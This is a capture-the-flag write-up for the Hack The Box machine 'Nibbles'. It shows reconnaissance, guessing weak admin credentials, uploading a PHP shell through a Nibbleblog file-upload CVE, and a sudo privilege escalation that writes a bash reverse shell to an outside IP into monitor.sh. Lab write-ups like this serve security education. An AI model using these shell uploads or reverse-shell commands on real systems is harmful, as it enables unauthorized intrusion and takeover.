---
title: "HTB: Nibbles"
tags: [htb, linux, easy, nibbleblog, metasploit, file-upload]

description: "Exploiting 'Nibbleblog' via an image upload plugin CVE and modifying a monitor script for root."
---

# Hack The Box: Nibbles

**Machine IP**: `10.10.10.75`
**OS**: Linux
**Difficulty**: Easy

Nibbles runs a vulnerable blogging platform called **Nibbleblog**. It requires guessing a weak password to enter the admin panel, then exploiting an Arbitrary File Upload vulnerability.

---

## 1. Reconnaissance

```bash
nmap -sC -sV 10.10.10.75
```
*   **80 (HTTP)**: Apache.

Visiting the site, we see a simple blog. Viewing source reveal a comment: `/nibbleblog/`.
We enumerate this directory.
*   `/nibbleblog/admin.php`: Admin login.
*   `/nibbleblog/README`: Version 4.0.3.

## 2. Exploitation

### Password Guessing
There is no default credential for Nibbleblog, but the box name is a hint.
We try `admin` / `nibbles`. It matches! We are in.

### CVE-2015-6967 (File Upload)
Searchsploit tells us Nibbleblog 4.0.3 allows arbitrary file upload via the "My Image" plugin.
1.  Go to **Plugins** -> **My Image**.
2.  Upload a PHP shell (`shell.php`) instead of an image.
    *   *Note*: The UI might warn about errors, but it usually uploads.
3.  Navigate to `/nibbleblog/content/private/plugins/my_image/image.php`.

Our shell executes. We assume the role of `nibbler`.

---

## 3. Privilege Escalation

We check sudo rights.
```bash
sudo -l
```
```text
User nibbler may run the following commands:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We can run `monitor.sh` as root.
However, the file doesn't exist! But the directory path implies we (nibbler) own it.
1.  Create the directory structure.
    `mkdir -p personal/stuff`
2.  Create the script with a reverse shell payload.
    ```bash
    echo "#!/bin/bash" > personal/stuff/monitor.sh
    echo "bash -i >& /dev/tcp/10.10.14.14/9999 0>&1" >> personal/stuff/monitor.sh
    chmod +x personal/stuff/monitor.sh
    ```
3.  Run it with sudo.
    `sudo /home/nibbler/personal/stuff/monitor.sh`

**Root Shell obtained.**

## Conclusion
This box demonstrates why **File Uploads** are so dangerous. Without validating the file extension or MIME type on the server side, an "Image Upload" feature is just a "Backdoor Upload" feature.
